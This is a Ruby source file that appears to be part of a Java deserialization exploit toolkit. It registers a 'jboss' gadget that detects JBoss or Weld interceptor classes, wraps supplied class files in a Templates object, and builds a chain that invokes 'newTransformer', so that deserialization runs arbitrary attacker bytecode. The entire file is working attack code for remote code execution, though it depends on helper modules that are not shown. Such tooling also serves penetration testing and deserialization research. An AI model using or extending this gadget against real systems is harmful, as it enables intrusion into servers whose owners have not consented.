

require_relative '../payloads/jboss'
require_relative '../payloads/templates'

class JBoss < Java::Gadgets::Gadget
  def id
    'jboss'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('jboss')

    unless params.fetch('classfiles', nil).nil?
      return false unless Java::Serialize::Payloads::Templates.supported(ctx)
    end

    true
  end

  def targets
    ['bytecode']
  end

  def create(ctx, params: {})
    weld = false
    if ctx.flag?('weld') ||
       ctx.class?('org.jboss.weld.interceptor.proxy.InterceptorMethodHandler')
      ctx.reg.load('model/weld.json')
      weld = true
    else
      ctx.reg.load('model/jboss.json')
    end

    if !params.fetch('classfiles', nil).nil?
      tpl = Java::Serialize::Payloads::Templates.make_jdk(params['classfiles'])
      Java::Serialize::Payloads::JBoss.make_invoke_noarg(tpl, 'Ljavax/xml/transform/Templates;', 'newTransformer', weld: weld)
    else
      raise 'Missing parameters'
    end
  end
end

Java::Gadgets.register(
  JBoss.new
)
